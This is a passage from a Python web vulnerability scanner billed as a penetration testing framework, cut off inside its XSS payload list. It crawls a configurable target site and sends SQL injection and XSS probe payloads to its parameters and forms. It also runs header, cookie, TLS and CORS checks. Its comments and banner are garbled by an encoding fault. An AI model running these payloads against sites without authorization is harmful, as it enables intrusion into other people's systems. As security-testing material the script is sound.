#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    PROFESSIONAL WEB PENETRATION TESTING FRAMEWORK v2.0
    à¦‡à¦¨à§à¦¡à¦¾à¦¸à§à¦Ÿà§à¦°à¦¿ à¦²à§‡à¦­à§‡à¦² à¦“à¦¯à¦¼à§‡à¦¬ à¦ªà§‡à¦¨à¦¿à¦Ÿà§à¦°à§‡à¦¶à¦¨ à¦Ÿà§‡à¦¸à§à¦Ÿà¦¿à¦‚ à¦«à§à¦°à§‡à¦®à¦“à¦¯à¦¼à¦¾à¦°à§à¦•
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    Automated Security Assessment & Vulnerability Scanner
    
    Features:
    - Multi-threaded scanning
    - Deep vulnerability detection
    - Automated exploitation testing
    - SQL Injection (Advanced)
    - XSS (Stored, Reflected, DOM-based)
    - CSRF, XXE, SSRF, LFI/RFI
    - Authentication bypass
    - Session management flaws
    - Directory traversal
    - Insecure deserialization
    - And 50+ more security checks
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"""

import requests
import re
import json
import ssl
import socket
import threading
import time
import hashlib
import base64
import random
import string
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from collections import defaultdict
import warnings
warnings.filterwarnings('ignore')

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ğŸ¯ TARGET CONFIGURATION - à¦à¦–à¦¾à¦¨à§‡ à¦Ÿà¦¾à¦°à§à¦—à§‡à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à§à¦¨
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

TARGET_URL = "https://example.com"  # ğŸ‘ˆ à¦à¦–à¦¾à¦¨à§‡ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà¦¾à¦°à§à¦—à§‡à¦Ÿ URL à¦¦à¦¿à¦¨

# Advanced Configuration
CONFIG = {
    'TARGET': TARGET_URL,
    'MAX_THREADS': 10,          # Concurrent threads
    'TIMEOUT': 10,               # Request timeout
    'MAX_DEPTH': 3,              # Crawling depth
    'AGGRESSIVE_MODE': True,     # More thorough but slower
    'EXPLOIT_TESTING': True,     # Test actual exploits
    'FOLLOW_REDIRECTS': True,
    'SCAN_SUBDOMAINS': False,    # Scan subdomains (experimental)
    'REPORT_FORMAT': 'detailed'  # 'detailed' or 'summary'
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CORE SCANNER ENGINE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Colors:
    """Terminal colors for better output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class AdvancedPenetrationTester:
    def __init__(self, config):
        self.config = config
        self.target = config['TARGET']
        self.vulnerabilities = []
        self.urls_found = set()
        self.forms_found = []
        self.cookies = {}
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.scan_start_time = None
        self.lock = threading.Lock()
        
    def print_banner(self):
        """Display professional banner"""
        banner = f"""
{Colors.CYAN}{'â•' * 80}
{Colors.BOLD}
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘    â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘       â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   
    â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘       â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•  â•šâ•â•â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
    â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘       â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
    â•šâ•â•     â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•       â•šâ•â•   â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   
                                                                      
    PROFESSIONAL PENETRATION TESTING FRAMEWORK v2.0
    à¦‡à¦¨à§à¦¡à¦¾à¦¸à§à¦Ÿà§à¦°à¦¿ à¦²à§‡à¦­à§‡à¦² à¦ªà§‡à¦¨à¦¿à¦Ÿà§à¦°à§‡à¦¶à¦¨ à¦Ÿà§‡à¦¸à§à¦Ÿà¦¿à¦‚ à¦«à§à¦°à§‡à¦®à¦“à¦¯à¦¼à¦¾à¦°à§à¦•
{Colors.ENDC}{Colors.CYAN}
{'â•' * 80}

{Colors.YELLOW}[*] Target: {Colors.GREEN}{self.target}
{Colors.YELLOW}[*] Scan Mode: {Colors.GREEN}{'Aggressive' if self.config['AGGRESSIVE_MODE'] else 'Passive'}
{Colors.YELLOW}[*] Max Threads: {Colors.GREEN}{self.config['MAX_THREADS']}
{Colors.YELLOW}[*] Max Depth: {Colors.GREEN}{self.config['MAX_DEPTH']}
{Colors.YELLOW}[*] Exploit Testing: {Colors.GREEN}{'Enabled' if self.config['EXPLOIT_TESTING'] else 'Disabled'}
{Colors.YELLOW}[*] Scan Started: {Colors.GREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{Colors.CYAN}{'â•' * 80}{Colors.ENDC}
"""
        print(banner)
        
    def log_vuln(self, severity, category, name, description, evidence, remediation, cwe=None):
        """Log vulnerability with detailed information"""
        with self.lock:
            vuln = {
                'timestamp': datetime.now().isoformat(),
                'severity': severity,
                'category': category,
                'name': name,
                'description': description,
                'evidence': evidence,
                'remediation': remediation,
                'cwe': cwe,
                'target': self.target
            }
            self.vulnerabilities.append(vuln)
            
            # Real-time console output
            severity_colors = {
                'CRITICAL': Colors.RED,
                'HIGH': Colors.RED,
                'MEDIUM': Colors.YELLOW,
                'LOW': Colors.BLUE,
                'INFO': Colors.CYAN
            }
            color = severity_colors.get(severity, Colors.ENDC)
            print(f"{color}[{severity}] {name}{Colors.ENDC}")
            print(f"  â””â”€ {description[:100]}...")
            
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # PHASE 1: RECONNAISSANCE & INFORMATION GATHERING
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    
    def reconnaissance(self):
        """Comprehensive information gathering"""
        print(f"\n{Colors.HEADER}{'â”€' * 80}")
        print(f"[PHASE 1] RECONNAISSANCE & INFORMATION GATHERING")
        print(f"{'â”€' * 80}{Colors.ENDC}\n")
        
        self.check_dns_info()
        self.check_ssl_tls()
        self.check_server_info()
        self.check_security_headers()
        self.check_cookie_security()
        self.check_cors_configuration()
        self.detect_waf()
        self.check_robots_txt()
        self.check_sitemap()
        
    def check_dns_info(self):
        """DNS information gathering"""
        print(f"{Colors.CYAN}[*] Gathering DNS information...{Colors.ENDC}")
        try:
            hostname = urlparse(self.target).netloc
            ip = socket.gethostbyname(hostname)
            
            self.log_vuln(
                'INFO', 'Information Disclosure', 'DNS Information',
                f'Hostname: {hostname}, IP: {ip}',
                f'IP Address: {ip}',
                'No immediate action required'
            )
        except Exception as e:
            print(f"  {Colors.YELLOW}â””â”€ DNS lookup failed: {str(e)}{Colors.ENDC}")
            
    def check_ssl_tls(self):
        """Advanced SSL/TLS security check"""
        print(f"{Colors.CYAN}[*] Analyzing SSL/TLS configuration...{Colors.ENDC}")
        
        if not self.target.startswith('https'):
            self.log_vuln(
                'HIGH', 'Transport Security', 'Missing HTTPS',
                'Website does not use HTTPS encryption',
                'URL uses HTTP protocol',
                'Implement HTTPS with valid SSL certificate',
                'CWE-319'
            )
            return
            
        try:
            hostname = urlparse(self.target).netloc
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    # Check certificate expiry
                    expire_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    if expire_date < datetime.now():
                        self.log_vuln(
                            'CRITICAL', 'Transport Security', 'Expired SSL Certificate',
                            'SSL certificate has expired',
                            f'Expiry date: {expire_date}',
                            'Renew SSL certificate immediately',
                            'CWE-295'
                        )
                    
                    # Check cipher strength
                    weak_ciphers = ['RC4', 'DES', 'MD5', 'NULL']
                    if any(weak in str(cipher) for weak in weak_ciphers):
                        self.log_vuln(
                            'HIGH', 'Transport Security', 'Weak SSL Cipher',
                            'Weak cryptographic cipher detected',
                            f'Cipher: {cipher}',
                            'Use strong cipher suites (AES-GCM, ChaCha20)',
                            'CWE-326'
                        )
                        
        except Exception as e:
            self.log_vuln(
                'HIGH', 'Transport Security', 'SSL Configuration Error',
                f'SSL/TLS configuration issue: {str(e)}',
                str(e),
                'Fix SSL/TLS configuration',
                'CWE-295'
            )
            
    def check_server_info(self):
        """Server information disclosure check"""
        print(f"{Colors.CYAN}[*] Checking server information disclosure...{Colors.ENDC}")
        
        try:
            response = self.session.get(self.target, timeout=self.config['TIMEOUT'])
            
            # Server header
            if 'Server' in response.headers:
                self.log_vuln(
                    'LOW', 'Information Disclosure', 'Server Header Disclosure',
                    'Server software information is exposed',
                    f"Server: {response.headers['Server']}",
                    'Remove or obfuscate Server header',
                    'CWE-200'
                )
            
            # X-Powered-By header
            if 'X-Powered-By' in response.headers:
                self.log_vuln(
                    'LOW', 'Information Disclosure', 'Technology Stack Disclosure',
                    'Technology stack information is exposed',
                    f"X-Powered-By: {response.headers['X-Powered-By']}",
                    'Remove X-Powered-By header',
                    'CWE-200'
                )
                
            # X-AspNet-Version
            if 'X-AspNet-Version' in response.headers:
                self.log_vuln(
                    'LOW', 'Information Disclosure', 'ASP.NET Version Disclosure',
                    'ASP.NET version is exposed',
                    f"X-AspNet-Version: {response.headers['X-AspNet-Version']}",
                    'Remove X-AspNet-Version header',
                    'CWE-200'
                )
                
        except Exception as e:
            print(f"  {Colors.YELLOW}â””â”€ Server info check failed{Colors.ENDC}")
            
    def check_security_headers(self):
        """Comprehensive security headers analysis"""
        print(f"{Colors.CYAN}[*] Analyzing security headers...{Colors.ENDC}")
        
        try:
            response = self.session.get(self.target, timeout=self.config['TIMEOUT'])
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': {
                    'severity': 'MEDIUM',
                    'description': 'Missing X-Frame-Options header - vulnerable to clickjacking',
                    'remediation': 'Add: X-Frame-Options: DENY or SAMEORIGIN',
                    'cwe': 'CWE-1021'
                },
                'X-Content-Type-Options': {
                    'severity': 'MEDIUM',
                    'description': 'Missing X-Content-Type-Options - vulnerable to MIME sniffing',
                    'remediation': 'Add: X-Content-Type-Options: nosniff',
                    'cwe': 'CWE-430'
                },
                'Strict-Transport-Security': {
                    'severity': 'HIGH',
                    'description': 'Missing HSTS header - vulnerable to SSL stripping',
                    'remediation': 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains',
                    'cwe': 'CWE-319'
                },
                'Content-Security-Policy': {
                    'severity': 'HIGH',
                    'description': 'Missing CSP header - vulnerable to XSS attacks',
                    'remediation': 'Implement Content-Security-Policy with strict directives',
                    'cwe': 'CWE-79'
                },
                'X-XSS-Protection': {
                    'severity': 'LOW',
                    'description': 'Missing X-XSS-Protection header',
                    'remediation': 'Add: X-XSS-Protection: 1; mode=block',
                    'cwe': 'CWE-79'
                },
                'Referrer-Policy': {
                    'severity': 'LOW',
                    'description': 'Missing Referrer-Policy - potential information leakage',
                    'remediation': 'Add: Referrer-Policy: strict-origin-when-cross-origin',
                    'cwe': 'CWE-200'
                },
                'Permissions-Policy': {
                    'severity': 'LOW',
                    'description': 'Missing Permissions-Policy header',
                    'remediation': 'Add Permissions-Policy to control browser features',
                    'cwe': 'CWE-16'
                }
            }
            
            for header, info in security_headers.items():
                if header not in headers:
                    self.log_vuln(
                        info['severity'],
                        'Security Headers',
                        f'Missing {header}',
                        info['description'],
                        f'{header} header not found',
                        info['remediation'],
                        info['cwe']
                    )
                    
        except Exception as e:
            print(f"  {Colors.YELLOW}â””â”€ Security headers check failed{Colors.ENDC}")
            
    def check_cookie_security(self):
        """Cookie security analysis"""
        print(f"{Colors.CYAN}[*] Analyzing cookie security...{Colors.ENDC}")
        
        try:
            response = self.session.get(self.target, timeout=self.config['TIMEOUT'])
            
            for cookie in response.cookies:
                # Check Secure flag
                if not cookie.secure and self.target.startswith('https'):
                    self.log_vuln(
                        'MEDIUM', 'Cookie Security', 'Cookie Missing Secure Flag',
                        f'Cookie "{cookie.name}" transmitted over HTTPS without Secure flag',
                        f'Cookie: {cookie.name}',
                        'Set Secure flag on all cookies transmitted over HTTPS',
                        'CWE-614'
                    )
                
                # Check HttpOnly flag
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    self.log_vuln(
                        'MEDIUM', 'Cookie Security', 'Cookie Missing HttpOnly Flag',
                        f'Cookie "{cookie.name}" accessible via JavaScript',
                        f'Cookie: {cookie.name}',
                        'Set HttpOnly flag to prevent XSS cookie theft',
                        'CWE-1004'
                    )
                
                # Check SameSite attribute
                if not cookie.has_nonstandard_attr('SameSite'):
                    self.log_vuln(
                        'MEDIUM', 'Cookie Security', 'Cookie Missing SameSite Attribute',
                        f'Cookie "{cookie.name}" vulnerable to CSRF attacks',
                        f'Cookie: {cookie.name}',
                        'Set SameSite attribute (Strict or Lax)',
                        'CWE-352'
                    )
                    
        except Exception as e:
            print(f"  {Colors.YELLOW}â””â”€ Cookie security check failed{Colors.ENDC}")
            
    def check_cors_configuration(self):
        """CORS misconfiguration check"""
        print(f"{Colors.CYAN}[*] Checking CORS configuration...{Colors.ENDC}")
        
        try:
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(self.target, headers=headers, timeout=self.config['TIMEOUT'])
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            # Check for wildcard with credentials
            if acao == '*' and acac == 'true':
                self.log_vuln(
                    'HIGH', 'CORS Misconfiguration', 'Dangerous CORS Configuration',
                    'CORS allows any origin with credentials',
                    f'ACAO: {acao}, ACAC: {acac}',
                    'Never use Access-Control-Allow-Origin: * with credentials',
                    'CWE-942'
                )
            
            # Check if reflects origin
            elif 'evil.com' in acao:
                self.log_vuln(
                    'HIGH', 'CORS Misconfiguration', 'CORS Reflects Arbitrary Origins',
                    'CORS policy reflects arbitrary origins',
                    f'ACAO: {acao}',
                    'Implement whitelist of allowed origins',
                    'CWE-942'
                )
                
        except Exception as e:
            print(f"  {Colors.YELLOW}â””â”€ CORS check failed{Colors.ENDC}")
            
    def detect_waf(self):
        """Web Application Firewall detection"""
        print(f"{Colors.CYAN}[*] Detecting Web Application Firewall...{Colors.ENDC}")
        
        try:
            # Test with malicious payload
            test_payload = "' OR '1'='1"
            response = self.session.get(
                f"{self.target}?test={test_payload}",
                timeout=self.config['TIMEOUT']
            )
            
            waf_signatures = {
                'Cloudflare': ['cloudflare', 'cf-ray'],
                'AWS WAF': ['aws', 'x-amzn'],
                'Akamai': ['akamai'],
                'Imperva': ['imperva', '_incap_'],
                'Sucuri': ['sucuri'],
                'ModSecurity': ['mod_security', 'modsecurity']
            }
            
            detected_waf = None
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig in str(response.headers).lower() or sig in response.text.lower():
                        detected_waf = waf_name
                        break
                        
            if detected_waf:
                print(f"  {Colors.GREEN}â””â”€ WAF detected: {detected_waf}{Colors.ENDC}")
                self.log_vuln(
                    'INFO', 'WAF Detection', f'{detected_waf} WAF Detected',
                    f'Web Application Firewall detected: {detected_waf}',
                    f'WAF: {detected_waf}',
                    'WAF may block some attack attempts',
                )
            else:
                print(f"  {Colors.YELLOW}â””â”€ No WAF detected - target may be vulnerable{Colors.ENDC}")
                
        except Exception as e:
            print(f"  {Colors.YELLOW}â””â”€ WAF detection failed{Colors.ENDC}")
            
    def check_robots_txt(self):
        """Check robots.txt for sensitive paths"""
        print(f"{Colors.CYAN}[*] Analyzing robots.txt...{Colors.ENDC}")
        
        try:
            robots_url = urljoin(self.target, '/robots.txt')
            response = self.session.get(robots_url, timeout=self.config['TIMEOUT'])
            
            if response.status_code == 200:
                sensitive_paths = []
                for line in response.text.split('\n'):
                    if line.startswith('Disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path and path != '/':
                            sensitive_paths.append(path)
                
                if sensitive_paths:
                    self.log_vuln(
                        'INFO', 'Information Disclosure', 'Robots.txt Exposes Paths',
                        'robots.txt reveals potentially sensitive paths',
                        f'Paths: {", ".join(sensitive_paths[:5])}...',
                        'Review exposed paths in robots.txt',
                        'CWE-200'
                    )
                    
        except Exception as e:
            pass
            
    def check_sitemap(self):
        """Check sitemap.xml"""
        print(f"{Colors.CYAN}[*] Checking sitemap.xml...{Colors.ENDC}")
        
        try:
            sitemap_urls = ['/sitemap.xml', '/sitemap_index.xml']
            for sitemap_path in sitemap_urls:
                sitemap_url = urljoin(self.target, sitemap_path)
                response = self.session.get(sitemap_url, timeout=self.config['TIMEOUT'])
                
                if response.status_code == 200:
                    # Extract URLs from sitemap
                    urls = re.findall(r'<loc>(.*?)</loc>', response.text)
                    self.urls_found.update(urls[:50])  # Add found URLs for further testing
                    print(f"  {Colors.GREEN}â””â”€ Found sitemap with {len(urls)} URLs{Colors.ENDC}")
                    break
                    
        except Exception as e:
            pass
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # PHASE 2: WEB CRAWLING & ATTACK SURFACE MAPPING
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    
    def crawl_and_map(self):
        """Comprehensive web crawling"""
        print(f"\n{Colors.HEADER}{'â”€' * 80}")
        print(f"[PHASE 2] WEB CRAWLING & ATTACK SURFACE MAPPING")
        print(f"{'â”€' * 80}{Colors.ENDC}\n")
        
        print(f"{Colors.CYAN}[*] Crawling website (depth: {self.config['MAX_DEPTH']})...{Colors.ENDC}")
        
        self.crawl_website(self.target, depth=0)
        
        print(f"{Colors.GREEN}[+] Found {len(self.urls_found)} unique URLs{Colors.ENDC}")
        print(f"{Colors.GREEN}[+] Found {len(self.forms_found)} forms{Colors.ENDC}")
        
    def crawl_website(self, url, depth=0):
        """Recursive website crawler"""
        if depth > self.config['MAX_DEPTH'] or url in self.urls_found:
            return
            
        try:
            self.urls_found.add(url)
            response = self.session.get(url, timeout=self.config['TIMEOUT'])
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract forms
            for form in soup.find_all('form'):
                form_details = self.extract_form_details(form, url)
                if form_details not in self.forms_found:
                    self.forms_found.append(form_details)
            
            # Extract links
            if depth < self.config['MAX_DEPTH']:
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    
                    # Only crawl same domain
                    if urlparse(full_url).netloc == urlparse(self.target).netloc:
                        if full_url not in self.urls_found:
                            self.crawl_website(full_url, depth + 1)
                            
        except Exception as e:
            pass
            
    def extract_form_details(self, form, url):
        """Extract form details for testing"""
        details = {
            'action': urljoin(url, form.get('action', '')),
            'method': form.get('method', 'get').lower(),
            'inputs': []
        }
        
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_type = input_tag.get('type', 'text')
            input_name = input_tag.get('name')
            input_value = input_tag.get('value', '')
            
            if input_name:
                details['inputs'].append({
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                })
                
        return details
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # PHASE 3: VULNERABILITY SCANNING
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    
    def vulnerability_scan(self):
        """Comprehensive vulnerability scanning"""
        print(f"\n{Colors.HEADER}{'â”€' * 80}")
        print(f"[PHASE 3] VULNERABILITY SCANNING")
        print(f"{'â”€' * 80}{Colors.ENDC}\n")
        
        # Multi-threaded scanning
        with ThreadPoolExecutor(max_workers=self.config['MAX_THREADS']) as executor:
            futures = []
            
            # SQL Injection
            futures.append(executor.submit(self.test_sql_injection))
            
            # XSS
            futures.append(executor.submit(self.test_xss))
            
            # CSRF
            futures.append(executor.submit(self.test_csrf))
            
            # XXE
            futures.append(executor.submit(self.test_xxe))
            
            # SSRF
            futures.append(executor.submit(self.test_ssrf))
            
            # LFI/RFI
            futures.append(executor.submit(self.test_lfi_rfi))
            
            # Authentication
            futures.append(executor.submit(self.test_authentication))
            
            # Session Management
            futures.append(executor.submit(self.test_session_management))
            
            # Directory Traversal
            futures.append(executor.submit(self.test_directory_traversal))
            
            # Command Injection
            futures.append(executor.submit(self.test_command_injection))
            
            # Open Redirect
            futures.append(executor.submit(self.test_open_redirect))
            
            # Insecure Deserialization
            futures.append(executor.submit(self.test_deserialization))
            
            # Wait for all scans to complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Colors.RED}[!] Scan error: {str(e)}{Colors.ENDC}")
    
    def test_sql_injection(self):
        """Advanced SQL Injection testing"""
        print(f"{Colors.CYAN}[*] Testing for SQL Injection vulnerabilities...{Colors.ENDC}")
        
        # Advanced SQL payloads
        sql_payloads = [
            # Error-based
            "'",
            "1' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' OR 1=1--",
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            
            # Boolean-based
            "' AND '1'='1",
            "' AND '1'='2",
            
            # Time-based
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            
            # Numeric
            "1 OR 1=1",
            "1' OR '1'='1",
            
            # Second-order
            "admin'/**/OR/**/1=1--",
        ]
        
        # Error patterns to detect
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL.*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"SqlClient\.",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_",
            r"Warning.*ora_",
            r"SQLite.*error",
            r"sqlite3.OperationalError",
            r"SQL command not properly ended",
            r"Unclosed quotation mark",
            r"syntax error.*near",
            r"database engine",
        ]
        
        tested_count = 0
        
        # Test URL parameters
        parsed = urlparse(self.target)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                for payload in sql_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url, timeout=self.config['TIMEOUT'])
                        tested_count += 1
                        
                        # Check for SQL errors
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                self.log_vuln(
                                    'CRITICAL',
                                    'SQL Injection',
                                    f'SQL Injection in parameter: {param}',
                                    f'Parameter "{param}" is vulnerable to SQL Injection',
                                    f'Payload: {payload}, Pattern: {pattern}',
                                    'Use parameterized queries/prepared statements',
                                    'CWE-89'
                                )
                                break
                                
                    except Exception as e:
                        pass
        
        # Test forms
        for form in self.forms_found[:20]:  # Test first 20 forms
            for payload in sql_payloads:
                try:
                    data = {}
                    for inp in form['inputs']:
                        if inp['type'] not in ['submit', 'button', 'image']:
                            data[inp['name']] = payload
                    
                    if form['method'] == 'post':
                        response = self.session.post(form['action'], data=data, timeout=self.config['TIMEOUT'])
                    else:
                        response = self.session.get(form['action'], params=data, timeout=self.config['TIMEOUT'])
                    
                    tested_count += 1
                    
                    # Check for SQL errors
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.log_vuln(
                                'CRITICAL',
                                'SQL Injection',
                                f'SQL Injection in form: {form["action"]}',
                                f'Form is vulnerable to SQL Injection',
                                f'Payload: {payload}',
                                'Use parameterized queries/prepared statements',
                                'CWE-89'
                            )
                            break
                            
                except Exception as e:
                    pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} SQL injection vectors{Colors.ENDC}")
    
    def test_xss(self):
        """Advanced XSS testing (Reflected, Stored, DOM-based)"""
        print(f"{Colors.CYAN}[*] Testing for Cross-Site Scripting (XSS)...{Colors.ENDC}")
        
        # Advanced XSS payloads
        xss_payloads = [
            # Basic
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            
            # Bypass filters
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "\"><script>alert('XSS')</script>",
            "';alert('XSS');//",
            
            # Event handlers
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<iframe src=\"javascript:alert('XSS')\">",
            
            # HTML5
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            
            # Polyglot
